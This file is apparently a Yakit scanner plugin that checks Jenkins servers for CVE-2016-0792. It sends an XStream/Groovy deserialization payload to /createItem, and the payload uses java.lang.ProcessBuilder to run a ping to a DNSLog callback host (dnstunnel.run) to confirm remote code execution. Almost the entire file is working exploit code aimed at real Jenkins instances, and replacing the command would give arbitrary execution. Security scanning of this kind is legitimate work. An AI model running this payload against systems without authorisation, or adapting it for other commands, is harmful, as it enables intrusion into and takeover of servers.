yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    server,token,err = risk.NewDNSLogDomain()
    par = "c"

    packet = `
POST /createItem?name=foo HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID.51669330=2ma9elc96wwk16e4k07sq0ri9; screenResolution=1440x900
Connection: keep-alive
Content-Type: text/xml
Content-Length: 889

<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="java.lang.ProcessBuilder">
              <command>
                <string>ping</string>
                <string>-{{params(par)}}</string>
                <string>1</string>
                <string>{{params(token)}}.dnstunnel.run</string>
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </delegate>
            <owner class="java.lang.ProcessBuilder" reference="../delegate"/>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>123</int>
  </entry>
</map>
`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"token":token,"par":par}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    sleep(3)

    dnsdata,dnserr = risk.CheckDNSLogByToken(token)
    if dnserr != nil {
      par = "n"
      rsp,req,_ = poc.HTTP(packet, 
      poc.params({"target":addr,"token":token,"par":par}),
      poc.https(isTls),
      poc.redirectTimes(0),
      )
      sleep(3)
      dnsdata,dnserr = risk.CheckDNSLogByToken(token)
    }

    // dump(rsp)
    if len(rsp) > 0 {
        if len(dnsdata) > 0 {
            yakit.Info("%v Jenkins createItem 代码执行漏洞 CVE-2016-0792", addr)
            risk.NewRisk(
                addr,risk.title("Jenkins createItem 代码执行漏洞 CVE-2016-0792"),
                risk.severity("high"),
                risk.titleVerbose("Jenkins createItem 代码执行漏洞 CVE-2016-0792"),
                risk.type("代码执行[Jenkins]"),
            )
        }
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.GetServiceName(), "jenkins") {
            handleCheck(result.Target,result.Port)  
        }
    }
    
}
